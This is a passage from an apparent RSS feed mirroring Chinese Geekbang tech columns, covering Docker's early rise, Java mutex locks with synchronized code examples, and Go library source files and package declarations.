&lt;p>总之，就一句话，&lt;strong>会挣钱的人一定是会投资的人&lt;/strong> 。我一直认为，&lt;strong>最宝贵的财富并不是钱，而是你的时间，时间比钱更宝贵，因为钱你不用还在那里，而时间你不用就浪费掉了。你把你的时间投资在哪些地方，就意味着你未来会走什么样的路。所以，利用好你的时间，投到一些有意义的地方吧&lt;/strong>。&lt;/p>
&lt;p>我的经历有限，只能看到这些，还希望大家一起来讨论，分享你的经验和心得，也让我可以学习和提高。&lt;/p>
&lt;p>&lt;img src="https://static001.geekbang.org/resource/image/fc/e9/fcc761001867c60f526665e237f831e9.jpg" alt="">&lt;/p></description></item><item><title>极客专栏: 02丨预习篇·小鲸鱼大事记（二）：崭露头角</title><link>/%E6%9E%81%E5%AE%A2%E4%B8%93%E6%A0%8F/%E6%B7%B1%E5%85%A5%E5%89%96%E6%9E%90-kubernetes/02%E4%B8%A8%E9%A2%84%E4%B9%A0%E7%AF%87%E5%B0%8F%E9%B2%B8%E9%B1%BC%E5%A4%A7%E4%BA%8B%E8%AE%B0%E4%BA%8C%E5%B4%AD%E9%9C%B2%E5%A4%B4%E8%A7%92/</link><pubDate>Fri, 27 May 2022 00:00:00 +0000</pubDate><guid>/%E6%9E%81%E5%AE%A2%E4%B8%93%E6%A0%8F/%E6%B7%B1%E5%85%A5%E5%89%96%E6%9E%90-kubernetes/02%E4%B8%A8%E9%A2%84%E4%B9%A0%E7%AF%87%E5%B0%8F%E9%B2%B8%E9%B1%BC%E5%A4%A7%E4%BA%8B%E8%AE%B0%E4%BA%8C%E5%B4%AD%E9%9C%B2%E5%A4%B4%E8%A7%92/</guid><description>
&lt;p>你好，我是张磊。我今天分享的主题是：小鲸鱼大事记之崭露头角。&lt;/p>
&lt;p>在上一篇文章中，我说到，伴随着 PaaS 概念的逐步普及，以 Cloud Foundry 为代表的经典 PaaS 项目，开始进入基础设施领域的视野，平台化和 PaaS 化成了这个生态中的一个最为重要的进化趋势。&lt;/p>
&lt;p>就在对开源 PaaS 项目落地的不断尝试中，这个领域的从业者们发现了 PaaS 中最为棘手也最亟待解决的一个问题：究竟如何给应用打包？&lt;/p>
&lt;p>遗憾的是，无论是 Cloud Foundry、OpenShift，还是 Clodify，面对这个问题都没能给出一个完美的答案，反而在竞争中走向了碎片化的歧途。&lt;/p>
&lt;p>而就在这时，一个并不引人瞩目的 PaaS 创业公司 dotCloud，却选择了开源自家的一个容器项目 Docker。更出人意料的是，&lt;strong>就是这样一个普通到不能再普通的技术，却开启了一个名为&amp;quot;Docker&amp;quot;的全新时代。&lt;/strong>&lt;/p>
&lt;p>你可能会有疑问，Docker 项目的崛起，是不是偶然呢？&lt;/p>
&lt;p>事实上，&lt;strong>这个以&amp;quot;鲸鱼&amp;quot;为注册商标的技术创业公司，最重要的战略之一就是：坚持把&amp;quot;开发者&amp;quot;群体放在至高无上的位置。&lt;/strong>&lt;/p>
&lt;p>相比于其他正在企业级市场里厮杀得头破血流的经典 PaaS 项目们，Docker 项目的推广策略从一开始就呈现出一副&amp;quot;憨态可掬&amp;quot;的亲人姿态，把每一位后端技术人员（而不是他们的老板）作为主要的传播对象。&lt;/p>
&lt;p>简洁的 UI，有趣的 demo，&amp;ldquo;1 分钟部署一个 WordPress 网站&amp;quot;&amp;ldquo;3 分钟部署一个 Nginx 集群&amp;rdquo;，这种同开发者之间与生俱来的亲近关系，使 Docker 项目迅速成为了全世界 Meetup 上最受欢迎的一颗新星。&lt;/p>
&lt;p>在过去的很长一段时间里，相较于前端和互联网技术社区，服务器端技术社区一直是一个相对沉闷而小众的圈子。在这里，从事 Linux 内核开发的极客们自带&amp;quot;不合群&amp;quot;的&amp;quot;光环&amp;rdquo;，后端开发者们啃着多年不变的 TCP/IP 发着牢骚，运维更是天生注定的幕后英雄。&lt;/p>
&lt;p>而 Docker 项目，却给后端开发者提供了走向聚光灯的机会。就比如 Cgroups 和 Namespace 这种已经存在多年却很少被人们关心的特性，在 2014 年和 2015 年竟然频繁入选各大技术会议的分享议题，就因为听众们想要知道 Docker 这个东西到底是怎么一回事儿。&lt;/p>
&lt;p>&lt;strong>而 Docker 项目之所以能取得如此高的关注，一方面正如前面我所说的那样，它解决了应用打包和发布这一困扰运维人员多年的技术难题；而另一方面，就是因为它第一次把一个纯后端的技术概念，通过非常友好的设计和封装，交到了最广大的开发者群体手里。&lt;/strong>&lt;/p>
&lt;p>在这种独特的氛围烘托下，你不需要精通 TCP/IP，也无需深谙 Linux 内核原理，哪怕只是一个前端或者网站的 PHP 工程师，都会对如何把自己的代码打包成一个随处可以运行的 Docker 镜像充满好奇和兴趣。&lt;/p>
&lt;p>这种受众群体的变革，正是 Docker 这样一个后端开源项目取得巨大成功的关键。这也是经典 PaaS 项目想做却没有做好的一件事情：PaaS 的最终用户和受益者，一定是为这个 PaaS 编写应用的开发者们，而在 Docker 项目开源之前，PaaS 与开发者之间的关系却从未如此紧密过。&lt;/p>
&lt;p>&lt;strong>解决了应用打包这个根本性的问题，同开发者与生俱来的的亲密关系，再加上 PaaS 概念已经深入人心的完美契机，成为 Docker 这个技术上看似平淡无奇的项目一举走红的重要原因。&lt;/strong>&lt;/p>
&lt;p>一时之间，&amp;ldquo;容器化&amp;quot;取代&amp;quot;PaaS 化&amp;quot;成为了基础设施领域最炙手可热的关键词，一个以&amp;quot;容器&amp;quot;为中心的、全新的云计算市场，正呼之欲出。而作为这个生态的一手缔造者，此时的 dotCloud 公司突然宣布将公司名称改为&amp;quot;Docker&amp;rdquo;。&lt;/p>
&lt;p>这个举动，在当时颇受质疑。在大家印象中，Docker 只是一个开源项目的名字。可是现在，这个单词却成了 Docker 公司的注册商标，任何人在商业活动中使用这个单词，以及鲸鱼的 Logo，都会立刻受到法律警告。&lt;/p>
&lt;p>那么，Docker 公司这个举动到底卖的什么药？这个问题，我不妨后面再做解读，因为相较于这件&amp;quot;小事儿&amp;quot;，Docker 公司在 2014 年发布 Swarm 项目才是真正的&amp;quot;大事儿&amp;quot;。&lt;/p>
&lt;p>那么，Docker 公司为什么一定要发布 Swarm 项目呢？&lt;/p>
&lt;p>通过我对 Docker 项目崛起背后原因的分析，你应该能发现这样一个有意思的事实：虽然通过&amp;quot;容器&amp;quot;这个概念完成了对经典 PaaS 项目的&amp;quot;降维打击&amp;quot;，但是 Docker 项目和 Docker 公司，兜兜转转了一年多，却还是回到了 PaaS 项目原本深耕了多年的那个战场：&lt;strong>如何让开发者把应用部署在我的项目上。&lt;/strong>&lt;/p>
&lt;p>没错，Docker 项目从发布之初就全面发力，从技术、社区、商业、市场全方位争取到的开发者群体，实际上是为此后吸引整个生态到自家&amp;quot;PaaS&amp;quot;上的一个铺垫。&lt;strong>只不过这时，&amp;ldquo;PaaS&amp;quot;的定义已经全然不是 Cloud Foundry 描述的那个样子，而是变成了一套以 Docker 容器为技术核心，以 Docker 镜像为打包标准的、全新的&amp;quot;容器化&amp;quot;思路。&lt;/strong>&lt;/p>
&lt;p>&lt;strong>这，正是 Docker 项目从一开始悉心运作&amp;quot;容器化&amp;quot;理念和经营整个 Docker 生态的主要目的。&lt;/strong>&lt;/p>
&lt;p>而 Swarm 项目，正是接下来承接 Docker 公司所有这些努力的关键所在。&lt;/p>
&lt;h2 id="总结">总结&lt;/h2>
&lt;p>今天，我着重介绍了 Docker 项目在短时间内迅速崛起的三个重要原因：&lt;/p>
&lt;ol>
&lt;li>
&lt;p>Docker 镜像通过技术手段解决了 PaaS 的根本性问题；&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Docker 容器同开发者之间有着与生俱来的密切关系；&lt;/p>
&lt;/li>
&lt;li>
&lt;p>PaaS 概念已经深入人心的完美契机。&lt;/p>
&lt;/li>
&lt;/ol>
&lt;p>崭露头角的 Docker 公司，也终于能够以一个更加强硬的姿态来面对这个曾经无比强势，但现在却完全不知所措的云计算市场。而 2014 年底的 DockerCon 欧洲峰会，则正式拉开了 Docker 公司扩张的序幕。&lt;/p>
&lt;h2 id="思考题">思考题&lt;/h2>
&lt;ol>
&lt;li>
&lt;p>你是否认同 dotCloud 公司改名并开启扩张道路的战略选择？&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Docker 公司凭借&amp;quot;开源&amp;quot;和&amp;quot;开发者社群&amp;quot;这两个关键词完成崛起的过程，对你和你所在的团队有什么启发？&lt;/p>
&lt;/li>
&lt;/ol>
&lt;p>感谢收听，欢迎你给我留言，也欢迎分享给更多的朋友一起阅读。&lt;/p>
&lt;p>&lt;img src="https://static001.geekbang.org/resource/image/47/55/47a6f3bf6b92d58512d5a2ed0a556f55.jpg" alt="">&lt;/p></description></item><item><title>极客专栏: 03丨互斥锁（上）：解决原子性问题</title><link>/%E6%9E%81%E5%AE%A2%E4%B8%93%E6%A0%8F/java%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B%E5%AE%9E%E6%88%98/03%E4%B8%A8%E4%BA%92%E6%96%A5%E9%94%81%E4%B8%8A%E8%A7%A3%E5%86%B3%E5%8E%9F%E5%AD%90%E6%80%A7%E9%97%AE%E9%A2%98/</link><pubDate>Sun, 29 May 2022 00:00:00 +0000</pubDate><guid>/%E6%9E%81%E5%AE%A2%E4%B8%93%E6%A0%8F/java%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B%E5%AE%9E%E6%88%98/03%E4%B8%A8%E4%BA%92%E6%96%A5%E9%94%81%E4%B8%8A%E8%A7%A3%E5%86%B3%E5%8E%9F%E5%AD%90%E6%80%A7%E9%97%AE%E9%A2%98/</guid><description>
&lt;p>在&lt;a href="https://time.geekbang.org/column/article/83682">第一篇文章&lt;/a>中我们提到，一个或者多个操作在 CPU 执行的过程中不被中断的特性，称为&amp;quot;原子性&amp;quot;。理解这个特性有助于你分析并发编程 Bug 出现的原因，例如利用它可以分析出 long 型变量在 32 位机器上读写可能出现的诡异 Bug，明明已经把变量成功写入内存，重新读出来却不是自己写入的。&lt;/p>
&lt;p>&lt;strong>那原子性问题到底该如何解决呢？&lt;/strong>&lt;/p>
&lt;p>你已经知道，原子性问题的源头是&lt;strong>线程切换&lt;/strong>，如果能够禁用线程切换那不就能解决这个问题了吗？而操作系统做线程切换是依赖 CPU 中断的，所以禁止 CPU 发生中断就能够禁止线程切换。&lt;/p>
&lt;p>在早期单核 CPU 时代，这个方案的确是可行的，而且也有很多应用案例，但是并不适合多核场景。这里我们以 32 位 CPU 上执行 long 型变量的写操作为例来说明这个问题，long 型变量是 64 位，在 32 位 CPU 上执行写操作会被拆分成两次写操作（写高 32 位和写低 32 位，如下图所示）。&lt;/p>
&lt;p>&lt;img src="https://static001.geekbang.org/resource/image/38/28/381b657801c48b3399f19d946bad9e28.png" alt="">&lt;/p>
&lt;p>在单核 CPU 场景下，同一时刻只有一个线程执行，禁止 CPU 中断，意味着操作系统不会重新调度线程，也就是禁止了线程切换，获得 CPU 使用权的线程就可以不间断地执行，所以两次写操作一定是：要么都被执行，要么都没有被执行，具有原子性。&lt;/p>
&lt;p>但是在多核场景下，同一时刻，有可能有两个线程同时在执行，一个线程执行在 CPU-1 上，一个线程执行在 CPU-2 上，此时禁止 CPU 中断，只能保证 CPU 上的线程连续执行，并不能保证同一时刻只有一个线程执行，如果这两个线程同时写 long 型变量高 32 位的话，那就有可能出现我们开头提及的诡异 Bug 了。&lt;/p>
&lt;p>&amp;ldquo;&lt;strong>同一时刻只有一个线程执行&lt;/strong> &amp;ldquo;这个条件非常重要，我们称之为&lt;strong>互斥&lt;/strong>。如果我们能够保证对共享变量的修改是互斥的，那么，无论是单核 CPU 还是多核 CPU，就都能保证原子性了。&lt;/p>
&lt;h2 id="简易锁模型">简易锁模型&lt;/h2>
&lt;p>当谈到互斥，相信聪明的你一定想到了那个杀手级解决方案：锁。同时大脑中还会出现以下模型：&lt;/p>
&lt;p>&lt;img src="https://static001.geekbang.org/resource/image/3d/a2/3df991e7de14a788b220468836cd48a2.png" alt="">
简易锁模型&lt;/p>
&lt;p>我们把一段需要互斥执行的代码称为&lt;strong>临界区&lt;/strong>。线程在进入临界区之前，首先尝试加锁 lock()，如果成功，则进入临界区，此时我们称这个线程持有锁；否则呢就等待，直到持有锁的线程解锁；持有锁的线程执行完临界区的代码后，执行解锁 unlock()。&lt;/p>
&lt;p>这个过程非常像办公室里高峰期抢占坑位，每个人都是进坑锁门（加锁），出坑开门（解锁），如厕这个事就是临界区。很长时间里，我也是这么理解的。这样理解本身没有问题，但却很容易让我们忽视两个非常非常重要的点：我们锁的是什么？我们保护的又是什么？&lt;/p>
&lt;h2 id="改进后的锁模型">改进后的锁模型&lt;/h2>
&lt;p>我们知道在现实世界里，锁和锁要保护的资源是有对应关系的，比如你用你家的锁保护你家的东西，我用我家的锁保护我家的东西。在并发编程世界里，锁和资源也应该有这个关系，但这个关系在我们上面的模型中是没有体现的，所以我们需要完善一下我们的模型。&lt;/p>
&lt;p>&lt;img src="https://static001.geekbang.org/resource/image/28/2f/287008c8137a43fa032e68a0c23c172f.png" alt="">
改进后的锁模型&lt;/p>
&lt;p>首先，我们要把临界区要保护的资源标注出来，如图中临界区里增加了一个元素：受保护的资源 R；其次，我们要保护资源 R 就得为它创建一把锁 LR；最后，针对这把锁 LR，我们还需在进出临界区时添上加锁操作和解锁操作。另外，在锁 LR 和受保护资源之间，我特地用一条线做了关联，这个关联关系非常重要。很多并发 Bug 的出现都是因为把它忽略了，然后就出现了类似锁自家门来保护他家资产的事情，这样的 Bug 非常不好诊断，因为潜意识里我们认为已经正确加锁了。&lt;/p>
&lt;h2 id="java-语言提供的锁技术synchronized">Java 语言提供的锁技术：synchronized&lt;/h2>
&lt;p>锁是一种通用的技术方案，Java 语言提供的 synchronized 关键字，就是锁的一种实现。synchronized 关键字可以用来修饰方法，也可以用来修饰代码块，它的使用示例基本上都是下面这个样子：&lt;/p>
&lt;pre>&lt;code>class X {
// 修饰非静态方法
synchronized void foo() {
// 临界区
}
// 修饰静态方法
synchronized static void bar() {
// 临界区
}
// 修饰代码块
Object obj = new Object()；
void baz() {
synchronized(obj) {
// 临界区
}
}
}
&lt;/code>&lt;/pre>
&lt;p>看完之后你可能会觉得有点奇怪，这个和我们上面提到的模型有点对不上号啊，加锁 lock() 和解锁 unlock() 在哪里呢？其实这两个操作都是有的，只是这两个操作是被 Java 默默加上的，Java 编译器会在 synchronized 修饰的方法或代码块前后自动加上加锁 lock() 和解锁 unlock()，这样做的好处就是加锁 lock() 和解锁 unlock() 一定是成对出现的，毕竟忘记解锁 unlock() 可是个致命的 Bug（意味着其他线程只能死等下去了）。&lt;/p>
&lt;p>那 synchronized 里的加锁 lock() 和解锁 unlock() 锁定的对象在哪里呢？上面的代码我们看到只有修饰代码块的时候，锁定了一个 obj 对象，那修饰方法的时候锁定的是什么呢？这个也是 Java 的一条隐式规则：&lt;/p>
&lt;blockquote>
&lt;p>当修饰静态方法的时候，锁定的是当前类的 Class 对象，在上面的例子中就是 Class X；&lt;br>
当修饰非静态方法的时候，锁定的是当前实例对象 this。&lt;/p>
&lt;/blockquote>
&lt;p>对于上面的例子，synchronized 修饰静态方法相当于:&lt;/p>
&lt;pre>&lt;code>class X {
// 修饰静态方法
synchronized(X.class) static void bar() {
// 临界区
}
}
&lt;/code>&lt;/pre>
&lt;p>修饰非静态方法，相当于：&lt;/p>
&lt;pre>&lt;code>class X {
// 修饰非静态方法
synchronized(this) void foo() {
// 临界区
}
}
&lt;/code>&lt;/pre>
&lt;h2 id="用-synchronized-解决-count1-问题">用 synchronized 解决 count+=1 问题&lt;/h2>
&lt;p>相信你一定记得我们前面文章中提到过的 count+=1 存在的并发问题，现在我们可以尝试用 synchronized 来小试牛刀一把，代码如下所示。SafeCalc 这个类有两个方法：一个是 get() 方法，用来获得 value 的值；另一个是 addOne() 方法，用来给 value 加 1，并且 addOne() 方法我们用 synchronized 修饰。那么我们使用的这两个方法有没有并发问题呢？&lt;/p>
&lt;pre>&lt;code>class SafeCalc {
long value = 0L;
long get() {
return value;
}
synchronized void addOne() {
value += 1;
}
}
&lt;/code>&lt;/pre>
&lt;p>我们先来看看 addOne() 方法，首先可以肯定，被 synchronized 修饰后，无论是单核 CPU 还是多核 CPU，只有一个线程能够执行 addOne() 方法，所以一定能保证原子操作，那是否有可见性问题呢？要回答这问题，就要重温一下&lt;a href="https://time.geekbang.org/column/article/84017">上一篇文章&lt;/a>中提到的&lt;strong>管程中锁的规则&lt;/strong>。&lt;/p>
&lt;blockquote>
&lt;p>管程中锁的规则：对一个锁的解锁 Happens-Before 于后续对这个锁的加锁。&lt;/p>
&lt;/blockquote>
&lt;p>管程，就是我们这里的 synchronized（至于为什么叫管程，我们后面介绍），我们知道 synchronized 修饰的临界区是互斥的，也就是说同一时刻只有一个线程执行临界区的代码；而所谓&amp;quot;对一个锁解锁 Happens-Before 后续对这个锁的加锁&amp;rdquo;，指的是前一个线程的解锁操作对后一个线程的加锁操作可见，综合 Happens-Before 的传递性原则，我们就能得出前一个线程在临界区修改的共享变量（该操作在解锁之前），对后续进入临界区（该操作在加锁之后）的线程是可见的。&lt;/p>
&lt;p>按照这个规则，如果多个线程同时执行 addOne() 方法，可见性是可以保证的，也就说如果有 1000 个线程执行 addOne() 方法，最终结果一定是 value 的值增加了 1000。看到这个结果，我们长出一口气，问题终于解决了。&lt;/p>
&lt;p>但也许，你一不小心就忽视了 get() 方法。执行 addOne() 方法后，value 的值对 get() 方法是可见的吗？这个可见性是没法保证的。管程中锁的规则，是只保证后续对这个锁的加锁的可见性，而 get() 方法并没有加锁操作，所以可见性没法保证。那如何解决呢？很简单，就是 get() 方法也 synchronized 一下，完整的代码如下所示。&lt;/p>
&lt;pre>&lt;code>class SafeCalc {
long value = 0L;
synchronized long get() {
return value;
}
synchronized void addOne() {
value += 1;
}
}
&lt;/code>&lt;/pre>
&lt;p>上面的代码转换为我们提到的锁模型，就是下面图示这个样子。get() 方法和 addOne() 方法都需要访问 value 这个受保护的资源，这个资源用 this 这把锁来保护。线程要进入临界区 get() 和 addOne()，必须先获得 this 这把锁，这样 get() 和 addOne() 也是互斥的。&lt;/p>
&lt;p>&lt;img src="https://static001.geekbang.org/resource/image/26/f6/26a84ffe2b4a6ae67c8093d29473e1f6.png" alt="">
保护临界区 get() 和 addOne() 的示意图&lt;/p>
&lt;p>这个模型更像现实世界里面球赛门票的管理，一个座位只允许一个人使用，这个座位就是&amp;quot;受保护资源&amp;rdquo;，球场的入口就是 Java 类里的方法，而门票就是用来保护资源的&amp;quot;锁&amp;quot;，Java 里的检票工作是由 synchronized 解决的。&lt;/p>
&lt;h2 id="锁和受保护资源的关系">锁和受保护资源的关系&lt;/h2>
&lt;p>我们前面提到，受保护资源和锁之间的关联关系非常重要，他们的关系是怎样的呢？一个合理的关系是：&lt;strong>受保护资源和锁之间的关联关系是 N:1 的关系&lt;/strong>。还拿前面球赛门票的管理来类比，就是一个座位，我们只能用一张票来保护，如果多发了重复的票，那就要打架了。现实世界里，我们可以用多把锁来保护同一个资源，但在并发领域是不行的，并发领域的锁和现实世界的锁不是完全匹配的。不过倒是可以用同一把锁来保护多个资源，这个对应到现实世界就是我们所谓的&amp;quot;包场&amp;quot;了。&lt;/p>
&lt;p>上面那个例子我稍作改动，把 value 改成静态变量，把 addOne() 方法改成静态方法，此时 get() 方法和 addOne() 方法是否存在并发问题呢？&lt;/p>
&lt;pre>&lt;code>class SafeCalc {
static long value = 0L;
synchronized long get() {
return value;
}
synchronized static void addOne() {
value += 1;
}
}
&lt;/code>&lt;/pre>
&lt;p>如果你仔细观察，就会发现改动后的代码是用两个锁保护一个资源。这个受保护的资源就是静态变量 value，两个锁分别是 this 和 SafeCalc.class。我们可以用下面这幅图来形象描述这个关系。由于临界区 get() 和 addOne() 是用两个锁保护的，因此这两个临界区没有互斥关系，临界区 addOne() 对 value 的修改对临界区 get() 也没有可见性保证，这就导致并发问题了。&lt;/p>
&lt;p>&lt;img src="https://static001.geekbang.org/resource/image/60/be/60551e006fca96f581f3dc25424226be.png" alt="">
两把锁保护一个资源的示意图&lt;/p>
&lt;h2 id="总结">总结&lt;/h2>
&lt;p>互斥锁，在并发领域的知名度极高，只要有了并发问题，大家首先容易想到的就是加锁，因为大家都知道，加锁能够保证执行临界区代码的互斥性。这样理解虽然正确，但是却不能够指导你真正用好互斥锁。临界区的代码是操作受保护资源的路径，类似于球场的入口，入口一定要检票，也就是要加锁，但不是随便一把锁都能有效。所以必须深入分析锁定的对象和受保护资源的关系，综合考虑受保护资源的访问路径，多方面考量才能用好互斥锁。&lt;/p>
&lt;p>synchronized 是 Java 在语言层面提供的互斥原语，其实 Java 里面还有很多其他类型的锁，但作为互斥锁，原理都是相通的：锁，一定有一个要锁定的对象，至于这个锁定的对象要保护的资源以及在哪里加锁 / 解锁，就属于设计层面的事情了。&lt;/p>
&lt;h2 id="课后思考">课后思考&lt;/h2>
&lt;p>下面的代码用 synchronized 修饰代码块来尝试解决并发问题，你觉得这个使用方式正确吗？有哪些问题呢？能解决可见性和原子性问题吗？&lt;/p>
&lt;pre>&lt;code>class SafeCalc {
long value = 0L;
long get() {
synchronized (new Object()) {
return value;
}
}
void addOne() {
synchronized (new Object()) {
value += 1;
}
}
}
&lt;/code>&lt;/pre>
&lt;p>欢迎在留言区与我分享你的想法，也欢迎你在留言区记录你的思考过程。感谢阅读，如果你觉得这篇文章对你有帮助的话，也欢迎把它分享给更多的朋友。&lt;/p>
&lt;p>&lt;img src="https://static001.geekbang.org/resource/image/cf/aa/cf393cd748a4f0e6451807c4b61843aa.jpg" alt="">&lt;/p></description></item><item><title>极客专栏: 03丨库源码文件</title><link>/%E6%9E%81%E5%AE%A2%E4%B8%93%E6%A0%8F/go-%E8%AF%AD%E8%A8%80%E6%A0%B8%E5%BF%83-36-%E8%AE%B2/03%E4%B8%A8%E5%BA%93%E6%BA%90%E7%A0%81%E6%96%87%E4%BB%B6/</link><pubDate>Sun, 29 May 2022 00:00:00 +0000</pubDate><guid>/%E6%9E%81%E5%AE%A2%E4%B8%93%E6%A0%8F/go-%E8%AF%AD%E8%A8%80%E6%A0%B8%E5%BF%83-36-%E8%AE%B2/03%E4%B8%A8%E5%BA%93%E6%BA%90%E7%A0%81%E6%96%87%E4%BB%B6/</guid><description>
&lt;p>你已经使用过 Go 语言编写了小命令（或者说微型程序）吗？&lt;/p>
&lt;p>当你在编写&amp;quot;Hello, world&amp;quot;的时候，一个源码文件就足够了，虽然这种小玩意儿没什么用，最多能给你一点点莫名的成就感。如果你对这一点点并不满足，别着急，跟着学，我肯定你也可以写出很厉害的程序。&lt;/p>
&lt;hr>
&lt;p>我们在上一篇的文章中学到了命令源码文件的相关知识，那么除了命令源码文件，你还能用 Go 语言编写库源码文件。那么什么是库源码文件呢？&lt;/p>
&lt;p>在我的定义中，&lt;strong>库源码文件是不能被直接运行的源码文件，它仅用于存放程序实体，这些程序实体可以被其他代码使用（只要遵从 Go 语言规范的话）。&lt;/strong>&lt;/p>
&lt;p>这里的&amp;quot;其他代码&amp;quot;可以与被使用的程序实体在同一个源码文件内，也可以在其他源码文件，甚至其他代码包中。&lt;/p>
&lt;blockquote>
&lt;p>那么程序实体是什么呢？在 Go 语言中，程序实体是变量、常量、函数、结构体和接口的统称。&lt;/p>
&lt;p>我们总是会先声明（或者说定义）程序实体，然后再去使用。比如在上一篇的例子中，我们先定义了变量&lt;code>name&lt;/code>，然后在&lt;code>main&lt;/code>函数中调用&lt;code>fmt.Printf&lt;/code>函数的时候用到了它。&lt;/p>
&lt;p>再多说一点，程序实体的名字被统称为标识符。标识符可以是任何 Unicode 编码可以表示的字母字符、数字以及下划线&amp;quot;_&amp;quot;，但是其首字母不能是数字。&lt;/p>
&lt;p>从规则上说，我们可以用中文作为变量的名字。但是，我觉得这种命名方式非常不好，自己也会在开发团队中明令禁止这种做法。作为一名合格的程序员，我们应该向着编写国际水准的程序无限逼近。&lt;/p>
&lt;/blockquote>
&lt;p>回到正题。&lt;/p>
&lt;p>我们今天的&lt;strong>问题是：怎样把命令源码文件中的代码拆分到其他库源码文件？&lt;/strong>&lt;/p>
&lt;p>我们用代码演示，把这个问题说得更具体一些。&lt;/p>
&lt;p>如果在某个目录下有一个命令源码文件 demo4.go，如下：&lt;/p>
&lt;pre>&lt;code>package main
import (
&amp;quot;flag&amp;quot;
)
var name string
func init() {
flag.StringVar(&amp;amp;name, &amp;quot;name&amp;quot;, &amp;quot;everyone&amp;quot;, &amp;quot;The greeting object.&amp;quot;)
}
func main() {
flag.Parse()
hello(name)
}
&lt;/code>&lt;/pre>
&lt;p>其中的代码你应该比较眼熟了。我在讲命令源码文件的时候贴过很相似的代码，那个源码文件名为 demo2.go。&lt;/p>
&lt;p>这两个文件的不同之处在于，demo2.go 直接通过调用&lt;code>fmt.Printf&lt;/code>函数打印问候语，而当前的 demo4.go 在同样位置调用了一个叫作&lt;code>hello&lt;/code>的函数。&lt;/p>
&lt;p>函数&lt;code>hello&lt;/code>被声明在了另外一个源码文件中，我把它命名为 demo4_lib.go，并且放在与 demo4.go 相同的目录下。如下：&lt;/p>
&lt;pre>&lt;code>// 需在此处添加代码。[1]
import &amp;quot;fmt&amp;quot;
func hello(name string) {
fmt.Printf(&amp;quot;Hello, %s!\n&amp;quot;, name)
}
&lt;/code>&lt;/pre>
&lt;p>那么问题来了：注释 1 处应该填入什么代码？&lt;/p>
&lt;h2 id="典型回答">&lt;strong>典型回答&lt;/strong>&lt;/h2>
&lt;p>答案很简单，填入代码包声明语句&lt;code>package main&lt;/code>。为什么？我之前说过，在同一个目录下的源码文件都需要被声明为属于同一个代码包。&lt;/p>
&lt;p>如果该目录下有一个命令源码文件，那么为了让同在一个目录下的文件都通过编译，其他源码文件应该也声明属于&lt;code>main&lt;/code>包。&lt;/p>
&lt;p>如此一来，我们就可以运行它们了。比如，我们可以在这些文件所在的目录下运行如下命令并得到相应的结果。&lt;/p>
&lt;pre>&lt;code>$ go run demo4.go demo4_lib.go
Hello, everyone!
&lt;/code>&lt;/pre>
&lt;p>或者，像下面这样先构建当前的代码包再运行。&lt;/p>
&lt;pre>&lt;code>$ go build puzzlers/article3/q1
$ ./q1
Hello, everyone!
&lt;/code>&lt;/pre>
&lt;p>在这里，我把 demo4.go 和 demo4_lib.go 都放在了一个相对路径为&lt;code>puzzlers/article3/q1&lt;/code>的目录中。&lt;/p>
&lt;p>在默认情况下，相应的代码包的导入路径会与此一致。我们可以通过代码包的导入路径引用其中声明的程序实体。但是，这里的情况是不同的。&lt;/p>
&lt;p>注意，demo4.go 和 demo4_lib.go 都声明自己属于&lt;code>main&lt;/code>包。我在前面讲 Go 语言源码的组织方式的时候提到过这种用法，即：源码文件声明的包名可以与其所在目录的名称不同，只要这些文件声明的包名一致就可以。&lt;/p>
&lt;p>顺便说一下，我为本专栏创建了一个名为&amp;quot;Golang_Puzzlers&amp;quot;的项目。该项目的 src 子目录下会存有我们涉及的所有代码和相关文件。&lt;/p>
&lt;p>也就是说，正确的用法是，你需要把该项目的打包文件下载到本地的任意目录下，然后经解压缩后把&amp;quot;Golang_Puzzlers&amp;quot;目录加入到环境变量&lt;code>GOPATH&lt;/code>中。还记得吗？这会使&amp;quot;Golang_Puzzlers&amp;quot;目录成为工作区之一。&lt;/p>
&lt;h2 id="问题解析">&lt;strong>问题解析&lt;/strong>&lt;/h2>
&lt;p>这个问题考察的是代码包声明的基本规则。这里再总结一下。&lt;/p>
&lt;p>第一条规则，同目录下的源码文件的代码包声明语句要一致。也就是说，它们要同属于一个代码包。这对于所有源码文件都是适用的。&lt;/p>
&lt;p>如果目录中有命令源码文件，那么其他种类的源码文件也应该声明属于&lt;code>main&lt;/code>包。这也是我们能够成功构建和运行它们的前提。&lt;/p>
&lt;p>第二条规则，源码文件声明的代码包的名称可以与其所在的目录的名称不同。在针对代码包进行构建时，生成的结果文件的主名称与其父目录的名称一致。&lt;/p>
&lt;p>对于命令源码文件而言，构建生成的可执行文件的主名称会与其父目录的名称相同，这在我前面的回答中也验证过了。&lt;/p>
&lt;p>好了，经过我的反复强调，相信你已经记住这些规则了。下面的内容也将会与它们相关。&lt;/p>
&lt;p>在编写真正的程序时，我们仅仅把代码拆分到几个源码文件中是不够的。我们往往会用模块化编程的方式，根据代码的功能和用途把它们放置到不同的代码包中。不过，这又会牵扯进一些 Go 语言的代码组织规则。我们一起来往下看。&lt;/p>
&lt;h2 id="知识精讲">&lt;strong>知识精讲&lt;/strong>&lt;/h2>
&lt;h3 id="1-怎样把命令源码文件中的代码拆分到其他代码包">1. 怎样把命令源码文件中的代码拆分到其他代码包？&lt;/h3>
&lt;p>我们先不用关注拆分代码的技巧。我在这里仍然依从前面的拆分方法。我把 demo4.go 另存为 demo5.go，并放到一个相对路径为&lt;code>puzzlers/article3/q2&lt;/code>的目录中。&lt;/p>
&lt;p>然后我再创建一个相对路径为&lt;code>puzzlers/article3/q2/lib&lt;/code>的目录，再把 demo4_lib.go 复制一份并改名为 demo5_lib.go 放到该目录中。&lt;/p>
&lt;p>现在，为了让它们通过编译，我们应该怎样修改代码？你可以先思考一下。我在这里给出一部分答案，我们一起来看看已经过修改的 demo5_lib.go 文件。&lt;/p>
&lt;pre>&lt;code>package lib5
import &amp;quot;fmt&amp;quot;
func Hello(name string) {
fmt.Printf(&amp;quot;Hello, %s!\n&amp;quot;, name)
}
&lt;/code>&lt;/pre>
&lt;p>可以看到，我在这里修改了两个地方。第一个改动是，我把代码包声明语句由&lt;code>package main&lt;/code>改为了&lt;code>package lib5&lt;/code>。注意，我故意让声明的包名与其所在的目录的名称不同。第二个改动是，我把全小写的函数名&lt;code>hello&lt;/code>改为首字母大写的&lt;code>Hello&lt;/code>。&lt;/p>
&lt;p>基于以上改动，我们再来看下面的几个问题。&lt;/p>
